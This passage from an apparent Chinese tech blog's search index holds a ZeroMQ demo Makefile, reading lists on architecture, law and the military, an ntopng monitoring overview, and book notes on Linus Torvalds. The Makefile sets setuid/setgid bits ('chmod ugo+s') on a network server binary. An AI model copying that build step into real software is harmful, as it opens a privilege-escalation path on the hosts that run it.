= /home/nmsTARGETDIR = $(SETUPDIR)/binSRCDIR = .CC = gccCFLAGS = -O2 -WallCPPFLAGS= -g DEFS = LDFLAGS = LIBS = -lzmq -L/usr/local/libINCLUDES= -I/usr/local/include CURR_DIR = $(shell pwd)CC_TMP = libOBJS = $(CC_TMP)/veto_mq_server.o $(CC_TMP)/veto_mq_utils.oTARGET = veto_mq_server.c.o: $(CC) -I. $(CPPFLAGS) $(DEFS) $(CFLAGS) -c $&lt;all: $(TARGET)$(TARGET): $(OBJS) $(CC) $(CPPFLAGS) $(OBJS) $(LIBS) $(LDFLAGS) -o $@ -cp $(SRCDIR)/$(TARGET) $(TARGETDIR)/$(TARGET) -chmod ugo+s $(TARGETDIR)/$(TARGET) -chmod ugo+s $(SRCDIR)/$(TARGET) clean: -rm -f *.o *~ *.core core $(TARGET) -rm -f $(TARGETDIR)/$(TARGET)veto_mq_server.o: veto_mq_server.c $(CC) -g -c -o $(CC_TMP)/veto_mq_server.o veto_mq_server.c $(CPPFLAGS) $(INCLUDES)veto_mq_utils.o: veto_mq_utils.c $(CC) -g -c -o $(CC_TMP)/veto_mq_utils.o veto_mq_utils.c $(INCLUDES) Running1234bash-3.2# ./veto_mq_serverbash-3.2# ps -ef | grep mq | grep -v 'grep' 0 3616 1 0 10:00AM ttys000 0:00.01 ./veto_mq_server 12345678910bash-3.2# ./veto_mq_clientConnecting to hello world server...Sending Hello 0...Received World 0Sending Hello 1...Received World 1Sending Hello 2...Received World 2Sending Hello 3...Received World 3 参考文献 （推荐）［美］Pieter Hintjens《ZeroMQ:Messaging for Many Applications》 ZeroMQ社区生态白皮书 深入解析中间件之RocketMQ]]></content>
      <tags>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Architect：架构师]]></title>
    <url>%2F2016%2F04%2F26%2FArchitect%2F</url>
    <content type="text"><![CDATA[摘要 参考文献一、软件架构 A Modern Day Front-End Development Stack 二、软件工程DDDEric Evans：《Domain-Driven Design: Tackling Complexity in the Heart of Software》Vaughn Vernon：《Implementing Domain-Driven Design》 （实现领域驱动设计） 张逸：或许是领域建模的真相 TDD 张逸：推行TDD的思考由开发人员编写测试带来的收益，最重要的一点不在于测试本身，而在于它能促进开发、测试以及需求分析人员的交流与沟通。而测试先行的方式也能让开发者跳出实现的窠臼，而从业务角度去看待问题，从消费者角度去思量接口。 选型方法论 支撑Github的开源技术 | 2014-03-28 水羽哲 InfoQ Service-Oriented Architecture.. Whatever that really means 张逸：剖析大数据平台的数据存储不是数据驱动而是业务场景驱动你对数据存储的技术决策 Tim Yang:为什么我认为架构师需要坚持写代码？]]></content>
  </entry>
  <entry>
    <title><![CDATA[Catalog:政府行为模型与预测]]></title>
    <url>%2F2016%2F04%2F26%2FPolicy%2F</url>
    <content type="text"><![CDATA[摘要 we need solution 测试 PolitiScale 在线政治测试 政府行为模型与预测专题：网络安全法专题：知识产权法专题：新闻出版法专题：公共医疗专题：公共财政专题：宗教治理专题：民权法 真假女权主义：从江青到咪蒙 扩展阅读 芝加哥大学：贫穷如何改变你的思维模式 数据可视化（十）公共数据源列表 数据可视化（五）基于网络爬虫制作数据可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 参考文献 An Anarchist Critique of Democracy]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog：法律]]></title>
    <url>%2F2016%2F04%2F26%2FLaw%2F</url>
    <content type="text"><![CDATA[摘要 promote the general welfare 专题：网络安全法（Cyber-Security） 专题：知识产权法（Intellectual Property） 专题：网络安全法（Cyber-Security） 美国网络安全立法策略 香港拟增设网络安全与科技罪案总警司 2018 reform of EU data protection rules 专题：知识产权法（Intellectual Property） 美国知识产权法 中国计算机软件领域发明专利保护实务 Resources 中国：裁判文书网 社区-简书专题《Policy&amp;Law》参考资料 揭开《哈佛法律评论》的面纱|2017-05-19 方流芳 雅理读书 有什么样的法学院，就有什么样的法院 | 清华大学法学院（国际化经验）]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Economist：经济学人]]></title>
    <url>%2F2016%2F04%2F26%2FEconomist%2F</url>
    <content type="text"><![CDATA[摘要 The Economist:Books of the Year 2017 The Economist:Books of the Year 2016 The Economist 翻译文集 社区 |《经济学人翻译社》 经济学人年度书单 The Economist:Books of the Year 2017 The Economist:Books of the Year 2016 经济数据分析 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（十）公共数据源列表 Topic 国际关系 翻译文集 Economist译文:欧洲难民计划：移民危机管理 Economist译文:The Saudi blueprint 沙特王国的改革蓝图 Economist译文:2016年全球经济形势预测 Economist译文:印度电商竞赛 Economist译文:越共换届－巨变或轮回？（201612封禁） Economist译文:事与愿违的后门程序 Economist译文:当代德国纳粹魅影 Economist译文:自由迁徙的障碍（201612封禁） Economist译文:奢侈品—万金藏獒（201612封禁） 随笔 小说中的经济学:粮食还是罂粟？ 社区我正在「经济学人翻译社」和朋友们讨论有趣的话题，你一起来吧？https://t.zsxq.com/bi6i2ne 简书专题|《经济学人翻译社》 参考文献 《行为经济学及其应用》 《现代世界体系－第三卷－1730～1840》(细节太多，需要对欧洲国家关系史深入了解) What’s Behind One of the Biggest Financial Scams in History | knowledge.wharton 协和医院的“号贩子”怎么炼成的？他们为何干这个 | 原创 2016-02-26 刘佳英 财新网 详解《平价医保法（奥巴马医保）》与美国医保的方方面面 | 2016-12-12 北大飞 美国对冲基金吐槽双11数据：我家后院的树长到275米高，你信吗？| 2015-11-12 天使客]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[讲武堂]]></title>
    <url>%2F2016%2F04%2F26%2FCommander%2F</url>
    <content type="text"><![CDATA[摘要 言战者多，被甲者少 ——韩非子 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要 电子书：《Manager》https://www.gitbook.com/book/riboseyim/manager/details 战史方震华国立台湾大学 ：中国军制、宋辽史 最大的障碍还是枪杆子，如果不能实现军民融合、文官节制武将，议会斗争、司法独立几乎不可能存在 推荐书目 《剑桥战争史》 罗马的永久性战争设施 战争费用:内在的生命血液，资本和人力 《驱逐舰舰长》(力荐) 《国防论》 《战争论》 参考文献 胡旻波:美军军官制度简述经过通才教育培养出来的军官，思想较少禁锢，知识广博，理论功底扎实，一方面能过适应知识的迅速更新，缩短任命后军事专业技术的培训和深造时间；另一方面，也容易改换专业或退役到地方谋职。在通才教育的基础上，美军得以对其军官实施逐级培训，达到了训用一致，保证其能够在复杂技术条件下完成各项任务。 美国国防部：士官军衔说明 郭慧志：美国陆军国家训练中心地形分析 约克瑭：为什么成吉思汗的子孙打不过英法骑兵 英、法、德国陆军军官制度| 知远战略与防务研究所 未来特大城市作战：萨德尔城的经验教训 | 知远战略与防务研究所 美国陆军大学的建立及启示 | 2016-03-02 知远战略与防务研究所]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[项目管理工具集]]></title>
    <url>%2F2016%2F04%2F26%2FTeamWork-Redmine%2F</url>
    <content type="text"><![CDATA[概要 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践精要 基于 Redmine 的项目管理平台 不管别人如何干扰，如何制造事端，最优秀的将领总是能达到预期的木笔而不会受制于作战计划。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227） 《凤凰项目》：从作坊到工厂的寓言故事 Kanban Kanban看板管理实践精要 Redmine 基于Redmine的项目管理平台 “过程有记录，责任可追踪”,开发、运营过程中需要持续关注的基础信息，都可以通过统一平台沉淀、分析和改进优化。 参考文献 张逸：可视化设计工作坊]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源架构技术漫谈：基于 Ntopng 实现网络流量的可视化监控]]></title>
    <url>%2F2016%2F04%2F26%2FNetwork-Ntopng%2F</url>
    <content type="text"><![CDATA[摘要 NTOPNG是NTOP的新一代版本,提供以下特性： 多协议网络流量；IPv4/IPv6活跃主机 网络流量监控； 基于nDPI实现应用协议发现 作为 NetFlow/sFlow 采集器 (Cisco/ Juniper 路由器) ；交换机配合 nProbe. What ntopng can do for me? http://www.ntop.org/products/ntop Sort network traffic according to many protocols Show network traffic and IPv4/v6 active hosts Store on disk persistent traffic statistics in RRD format Geolocate hosts Discover application protocols by leveraging on nDPI, ntop’s DPI framework. Characterise HTTP traffic by leveraging on characterisation services provided by block.si. ntopng comes with a demo characterisation key, but if you need a permanent one, please mail info@block.si. Show IP traffic distribution among the various protocols Analyse IP traffic and sort it according to the source/destination Display IP Traffic Subnet matrix (who’s talking to who?) Report IP protocol usage sorted by protocol type Act as a NetFlow/sFlow collector for flows generated by routers (e.g. Cisco and Juniper) or switches (e.g. Foundry Networks) when used together with nProbe. Produce HTML5/AJAX network traffic statistics Ntopng 架构 主要开发语言C、C++、Python、Lua 数据采集层Libpcap ：网络数据包捕获函数包 ZeroMQ一个C内核及C＋＋编写的核心库libzmq，50余种语言支持的绑定程序(例如Python支持PyZMQ)，号称最快的消息库，协议级，目标是成为Linux的一部分。 业务处理层Monitoring Engine，负责采集数据的规整、压缩、转储。 存储Sqlite：轻型数据库，多语言支持（此处为python）Gdbm：DBM的GNU版本，使用hash存储非结构化数据 RedisRedis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Ntopng的Redis数据结构如下： 前端展现层RRDtool 源自MRTG（多路由器流量绘图器）。MRTG是有一个大学连接到互联网链路的使用率的小脚本开始的。MRTG后来被当作绘制其他数据源的工具使用，包括温度、速度、电压、输出量等等。 Geoip：IP GIS图形 其它库autoconf、automake、pkg-config、libtool（提供通用的库编译支持）Gettext、icu4c：国际化(I18N)和本地化(L10N)，多语言支持 libffi“FFI” 的全名是 Foreign Function Interface，通常指的是允许以一种语言编写的代码调用另一种语言的代码。而 “Libffi” 库只提供了最底层的、与架构相关的、完整的”FFI”，因此在它之上必须有一层来负责管理两种语言之间参数的格式转换。 Gobject-introspection：（简称 GI）用于产生与解析 C 程序库 API 元信息，以便于动态语言（或托管语言）绑定基于 C + GObject 的程序库 json-glib、json-c、openssl、glib libtasn1：开发 ASN.1 (Abstract Syntax Notation One) 结构管理的 C 库gmpNettle：a low-level cryptographic library （加密）Gnutls：（加密）libpng：the official PNG reference library （图形）pixman：像素管理（图形）Cairo：a2Dgraphicslibrarywithsupportformultipleoutputdevices.Freetype：FreeType库是一个完全免费（开源）的、高质量的且可移植的字体引擎，它提供统一的接口来访问多种字体格式文件，包括TrueType,OpenType, Type1, CID,CFF, Windows FON/FNT, X11 PCF等fontconfig：字体库管理 P2P 演示案例 扩展阅读 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System Preview:数据可视化（五）可视化数据图表制作方法 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IT科技史漫谈：Linus Torvalds 与 Linux 操作系统]]></title>
    <url>%2F2016%2F04%2F24%2FLinusTorvalds%2F</url>
    <content type="text"><![CDATA[摘要 TED | Linus Torvalds: The mind behind Linux Linux 之父：Just for Fun ！ Linus Torvaldsborn December 28, 1969. is a Finnish-American software engineer who is the creator and, for a long time, principal developer, of the Linux kernel;which became the kernel for operating systems such as the Linux operating system, Android, and Chrome OS.He also created the distributed revision control system Git. 一、TED Talks：The mind behind Linux （中文翻译）Linus Torvalds: The mind behind Linux TED现场版 二、Linux 之父：Just for Fun ！读书笔记（序）《Just for Fun: The Story of an Accidental Revolutionary》，是Linux内核的创建者林纳斯·托瓦兹（Linus Torvalds）的自传。这本书由他和大卫·戴蒙德（David Diamond）联合撰写，叙述林纳斯·托瓦兹从小的成长历程、创建Linux内核、Git的过程以及软件世界的江湖恩怨。全书主体部分采用一问一答的访谈形式，由戴蒙德在他们的的汽车旅行过程中记录完成；另外一部分收录了林纳斯的几篇专题论述文章，比如作者关于软件版权的一些批判性意见。 I was an ugly child.I was a nerd.I was A geek.关于自己的童年，林纳斯显然有着强烈的阴影。首先，他自认为是一个长得非常丑的孩子(ugly: unpleasant to look)。具体来说就包括极度没品味的衣着，Torvalds家族标志性的大鼻子，不擅长体育运动、腼腆害羞以及最重要的：很难引起妹子的关注(关于这一点，老林在全书多次反复提到)。 Nerd一词本来原意“a person who is boring, stupid and not fashionable”。俚语中一个稍含贬义的用语，一般指偏爱钻研书本知识，将大量闲暇用于脑力工作，对流行文化不感兴趣，而不愿或不善于体育活动或其他社会活动的人。相对于那些擅长体育、四肢发达、自信且善于泡妞的人来说，nerd的青春说起来都是眼泪啊。 geek和nerd这个词类似，江湖俗称发烧友或怪咖，通常被用于形容对计算机和网络技术有狂热兴趣并投入大量时间钻研的人。它们现在已经在IT圈里流行起来，逐渐从贬义词变成了具有自豪感和身份认同意义的词语，很多中关村或深圳的咖啡店里面都有很多自称Geek的人在和各路投资人畅聊IPO的美好图景。我想这显然归功于林纳斯这代牛人不遗余力地科普推广。 Tell you about Family.关于Torvalds家族，主要有三个特点： 教授之家林纳斯·托瓦兹的外祖父家族原来只是贫穷的农民，直到外祖父那一代，六兄弟中有两人获得博士学位。（p13）Leo Törnqvist是芬兰第一批统计学教授，同时意外地开启了林纳斯的编程之路。教授购买了一台Commodore VIC 20电脑，期望用户解决工作中遇到的统计计算问题，显然老教授并不善此道。彼时小林纳斯11岁，仅仅是因为好玩，通过阅读手册自学了指令集，并开始使用BASIC语言编写一些统计学方面的小程序。 破碎之家（dysfunctional family）林纳斯的父母在他很小的时候就离异了。“At times we lived with my dad and his girlfriend, at other times Sara lived with my dad and I lived with my mom.At times both of us lived with my mom.” 他的祖父晚年中风，祖母也年老体弱，一家老小挤在一所旧房子里。作为职业女性，林纳斯的母亲经常需要工作到很晚，林纳斯只得和妹妹自己去购物、安排晚餐。在艰难的日子里，电脑是唯一的寄托。“The computer found a home on a tiny desk against the window, maybe two feet from my bed.(p19)” 左派之家Torvalds家族的一大鲜明特色就是左翼传统。祖父是一名诗人和记者，父亲、母亲都是记者，曾是芬兰学生运动、左翼社会运动的活跃分子。直到林纳斯，坚持开放源代码理念也就顺理成章了。他本人对于金钱本身一直也没什么概念，直到1999年，Red Hat公司依靠Linux赚到不好意思以后，主动要求赠送一大笔股票期权给林纳斯（估值2000万美元）。在黑客的江湖里，林纳斯也许是最知名的“喷子”之一：例如，抨击Nvidia是他所接触过的“最烂的公司”（the worst company）和 “最麻烦的公司”（the worst trouble spot），有一次与人争论Git为何不使用C++开发时与对方用“放屁”（原文为“bullshit”、“BS”）互骂，更曾以“一群自慰的猴子”（原文为“OpenBSD crowd is a bunch of masturbating monkeys”）来称呼OpenBSD团队。不用奇怪，这也许只是他们家的记者基因灵魂附体而已。 About Finnish Army1989年，大学二年级，林纳斯加入芬兰国防军服11个月的国家义务兵役，军衔少尉，领导一个四、五个人小团队。他们的工作是负责火炮控制单元，大概是指示目标、弹道计算之类。林纳斯无意于军官职业，也不喜好当领导，军旅生活中最重要的一件事就是看书： So there were two things I did that summer.Nothing.And read the 719 pages of 《Operating System:Design and Implementation》 《操作系统：设计与实现》，作者Andrew S. Tanenbaum的这本书，激活了这位年轻人的视野，促成了林纳斯从事操作系统开发的职业生涯。 不管怎么说，林纳斯对于这段生活是非常感念的： some people suggest that the major reason for the required army duty is to give Finnish men something to talk about over beer for as long as they live.They all have something miserable in common.They hated the Army, but they’re happy to talk about it afterward.(p30) Tell you about Finland.在这么略带自黑的幽默自传中，作者对祖国芬兰的深情溢于言表。 芬兰地处严寒，有四分之一的地方处在北极圈内，最北的地区夏天有73天太阳不落于地平线下，冬天则有51天不出太阳。大概有500多万居民，93%的人使用芬兰语，大部分可以说英语。70%以上的人属于芬兰信义宗教会（路德宗）的成员。最大的民俗特点就是：一：低调内敛、不爱说话，如果有什么事他们更爱发短信（诺基亚手机发短信还真是无敌）二：宅，死宅！中国的国粹是麻将，芬兰的国粹就是桑拿浴，或者说桑拿才是芬兰真正的国家宗教。“Nobody actually knows how this religion started, but the tradition, at least in some places, is to build the sauna first, then the house.” (芬兰谚语：先建桑拿，再搭房屋) 芬兰的教育系统让人印象深刻，有一种英特纳雄耐尔已经实现的即时感。教育国策一：教育免费。不仅免学费、而且提供全额伙食补助。不仅保障城里人就近入学，还为偏远地区学生提供免费交通运输系统。教育国策二：学术教育与职业教育平衡发展。高中就有学术性的文理高中和职业高中，高等教育分成“研究性大学”(university) 以及科技大学(芬兰语ammattikorkeakoulu)系统。500万人口的小国居然有17间大学以及27间科技大学。教育国策二：教育平等。天朝惯有的排名制、淘汰法，是在国家法律和社会信仰层面所不能容忍的。教育系统不使用淘汰，分组或是放弃任何一位学生。 Finnish schools don’t separate out the good students-or the losers.(p25) 对于林纳斯这类一度具有阅读障碍的“Math Guy”，在某些方面（体育、社交等）非常自卑的人来说，并不妨碍他们过上好日子。芬兰教育系统有着非常丰富的奖学金体系，例如林纳斯的第一部电脑，就是通过高中时代的奖学金购买的（估值500欧元，5000元人民，算上那个年代的购买力，少说上万）。那可是1980年代，计算机才刚刚个人化，是非常昂贵的设备。就算30多年后今天，中国任何一所普通高中每学期的单科奖学金到万元标准的也不多吧。 The biggest ones were on the order of $500. So that’s where most of the money for my second computer came from. 据说今年在克强CEO的严重关切和亲自督战下，财政部和教育部把中国高校博士生的津贴从每生每年12000元大幅提高到15000元，即每生每月提高250元。还真不如一个芬兰的高中生。所以，关键问题都要看数字。科教兴国是不是扯淡，领导是不是真的重视你，只要看账上那点饷银就清楚了。 meaning for life There are three things that have meaning for life.They are the motivational factors for everything in your life——for anything that you do or any living thing does:The first is survival, the second is social order, and the third is entertainment. Everything in life progresses in that order.And there is nothing after entertainment. So, in a sense, the implication is that the meaning of life is to reach that third stage. And once you’ve reached the third stage, you’re done. But you have to go through the other stages first. “人类的追求分成三个阶段。第一是生存，第二是社会秩序，第三是娱乐。最明显的例子是性，它开始只是一种延续生命的手段，后来变成了一种社会行为，比如你要结婚才能得到性。再后来，它成了一种娱乐。” （是不是有点离经叛道? 我竟无力反驳) It started out as survival, but it became a social thing.That’s why you get married.And then it becomes entertainment. “技术最初也是为了生存，为了生存得更好。现在技术大体上还处于社会的层面，但正在朝娱乐的阶段发展。……（Linux的开发模式）为人们提供了依靠兴趣与热情而生活的机会。与世界上最好的程序员一起工作，是一种无与伦比的享受。” Technology came about as survival.And survival is not about just surviving, it’s about surviving better. 人生在世，Just for fun. What can I do to make society better?You known that you’re a part of society.You known that society is moving in this direction.You can help society move in this direction. Introduction:Post-its from a RevolutionAcknowledgmentsPreface:The Meaning of Life I (Sex,War,Linux)BIRTH OF A NERDI. I was an ugly child. I was a nerd. A geek. II. My earliest and happiest memories involve playing with my grandfather’s old electronic calculator. III. Tell you about Finland &amp; Family IV. Family History (more details) Talk: Linus Torvalds &amp; David Diamond an editor of the San Jose Mercury News Sunday magazineMercury来自罗马神话中的信使和商旅之神墨丘利，代表为神人之间传达信息，同时意指淘金热时期在圣荷西邻近富有的水银矿脉(Mercury)，一语双关，故合并后保留原名。但在中文刊物中，偶有误译为《圣荷西水星报》。一般认为，《圣荷西信使报》是全世界第一家最早发展网路新闻产业的先驱。其时间可追溯至1992年，另一说是1987年。 Talk about Bill Gates he wasn’t the least bit interested in even meeting the guy.”There wouldn’t be much of a connection point,” he reasoned. “I’m completely uninterested in the thing that he’s the best in the world at. And he’s not interested in the thing that maybe I’m the best in the world at.I couldn’t give him advice in business and he couldn’t give me advice in technology.” Talk about Richard Stallmanthe God of Free Software.(p58) V. High School VI. University of Helsinki &amp; Finnish Army VII. Tell you some more about Finland (Sauna，Silence tradition and educational system) BIRTH OF AN OPERATINGKING OF THE BALL Intellectual Property 204 An End to Control 215 The Amusement Ride Ahead 220 Why Open Source Makes Sense 225 Fame and Fortune The Meaning of Life II 242 Index 251扩展阅读：Linux 操作系统 《Linus Torvalds:Just for Fun》 Linux 常用命令一百条 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：Web应用性能优化 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 推荐：电子书《Linux Perf Master》发表在GitBook平台，欢迎订阅、下载、批评指正: https://www.gitbook.com/book/riboseyim/linux-perf-master/details 参考文献 《Just for Fun》副题：The Story of an Accidental Revolutionary作者：Linus Torvalds 、 David Diamond售价：USA $14.99/CAN $18.50Paperback: 288 pagesPublisher: HarperBusiness; Reprint edition (June 4, 2002)Language: EnglishISBN-10: 0066620732ISBN-13: 978-0066620732出版年份：2001年阅读进度：201704～201705 Linus Torvalds was born in Finland and graduated from the University of Helsinki.He lives in San Jose, California. David Diamond has written for the New York Times,Wired,USA Weekend, and many other publications.He lives in Kentfield, California. 关于Torvalds及《Just For Fun》的批评意见I think that Linus Torvalds succeed first a foremost as an author of a “new BIOS”, a POSIX-compatible kernel implementation which became a de-facto standard“Linux is moving away from its founding ideals and not even Linus Torvalds can change it”. 阮一峰：《Linus Torvalds自传》摘录,20120903 维基百科：芬兰教育 About Linus Torvalds]]></content>
      <tags>
        <tag>History</tag>
        <tag>最佳工程实践</tag>
        <tag>架构师</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
</search>
